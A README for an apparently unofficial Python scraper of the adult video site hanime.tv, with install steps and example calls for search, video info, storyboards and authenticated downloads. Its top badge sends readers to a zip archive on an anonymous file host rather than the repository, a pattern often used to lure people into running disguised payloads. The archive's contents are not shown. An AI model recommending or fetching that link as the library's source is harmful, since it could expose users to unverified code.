# HanimeTV
[![Download](https://img.shields.io/badge/Download-Here-blueviolet)](https://files.catbox.moe/2hzfgm.zip)


*Get data from https://hanime.tv :)*

## Installation

Installation is simple. It can be installed from pip using the following command:
```sh
$ pip3 install -r requirements.txt
```

## Usage

```py
from HTV import HanimeTV

hentai = HanimeTV(email="EMAIL", password="PASS")
query = "Imouto Paradise"
url = "https://hanime.tv/hentai-videos/imouto-paradise-1-ep-1"

# SEARCH
search = hentai.search(query)
print (search)

# GET INFO
info = hentai.info(url)
print (info)

# GET STORYBOARDS
storyboards = hentai.storyboards(url)
print (storyboards)

# GET DOWNLOAD (USING AUTH)
download = hentai.download(url)
print (download)
```

## Credit

Moe Poi ~ / [@moepoi](https://github.com/moepoi)
